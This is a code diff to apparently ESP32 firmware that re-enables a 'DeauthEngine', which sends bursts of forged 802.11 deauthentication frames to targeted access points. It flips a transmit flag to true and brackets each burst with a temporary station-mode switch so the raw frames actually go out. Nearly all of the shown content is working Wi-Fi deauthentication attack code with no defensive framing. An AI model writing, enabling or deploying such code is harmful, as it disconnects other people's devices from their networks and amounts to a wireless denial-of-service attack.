@@ -27,13 +27,10 @@ struct __attribute__((packed)) DeauthFrame {
 constexpr uint16_t kFrameControlDeauth = 0x00C0;
 constexpr uint16_t kReasonClass3FromNonassoc = 0x0007;
 
-// Flip once a safe way to get esp_wifi_80211_tx() working without breaking esp-aes is found (see
-// DeauthEngine.h's class comment on the WIFI_MODE_STA revert). Until then, sendDeauthBurst()
-// skips the transmit attempt entirely rather than making calls that are guaranteed to fail with
-// no STA interface up — field testing showed those calls (6x esp_wifi_80211_tx + delay(2) each,
-// run synchronously inside WifiSniffer::tick()'s main-loop queue drain) were enough blocking on
-// their own to overflow the raw observation queue and visibly lag the device.
-constexpr bool kTxCapable = false;
+// See DeauthEngine.h's class comment: re-enabled behind a transient WIFI_MODE_STA switch scoped
+// to a single burst, rather than the permanent STA mode that crashed the device before. Flip back
+// to false if real-hardware testing shows this still isn't safe.
+constexpr bool kTxCapable = true;
 }  // namespace
 
 bool DeauthEngine::begin() {
@@ -76,7 +73,7 @@ DeauthEngine::BssidTrack& DeauthEngine::trackerFor(uint32_t bssidHash) {
 
 bool DeauthEngine::sendDeauthBurst(const MacAddress& bssid, uint8_t channel) {
   totalBursts++;
-  if (!kTxCapable) return false;  // see kTxCapable's comment — guaranteed to fail right now, so don't even try
+  if (!kTxCapable) return false;
 
   DeauthFrame frame{};
   frame.frameControl = kFrameControlDeauth;
@@ -87,6 +84,17 @@ bool DeauthEngine::sendDeauthBurst(const MacAddress& bssid, uint8_t channel) {
   frame.seqCtrl = 0;
   frame.reasonCode = kReasonClass3FromNonassoc;
 
+  // Transient TX-capable mode, scoped to just this burst — see DeauthEngine.h's class comment for
+  // why bracketing it this way (rather than the permanent STA mode that crashed the device
+  // before) is expected to avoid the esp-aes interrupt-allocation conflict. WifiSniffer's own
+  // resting mode (WIFI_MODE_NULL) is untouched by this — it's switched back the moment the burst
+  // is done, win or lose.
+  const esp_err_t modeErr = esp_wifi_set_mode(WIFI_MODE_STA);
+  if (modeErr != ESP_OK) {
+    LOG_ERR("DEAUTH", "esp_wifi_set_mode(STA) failed: %d — skipping burst", modeErr);
+    return false;
+  }
+
   esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
 
   bool anyFailed = false;
@@ -96,6 +104,16 @@ bool DeauthEngine::sendDeauthBurst(const MacAddress& bssid, uint8_t channel) {
     }
     totalFrames++;
     delay(2);
+  }
+
+  const esp_err_t revertErr = esp_wifi_set_mode(WIFI_MODE_NULL);
+  if (revertErr != ESP_OK) {
+    // Failing to revert is worse than failing to transmit — leaving the radio in STA mode is
+    // exactly the persistent-mode situation that crash-looped before. Surface it loudly; there's
+    // nothing else to do about it here besides let the heap-health circuit breaker's restart
+    // (main.cpp) recover to a clean boot.
+    LOG_ERR("DEAUTH", "esp_wifi_set_mode(NULL) revert failed: %d — radio may be stuck in STA mode",
+            revertErr);
   }
   return !anyFailed;
 }
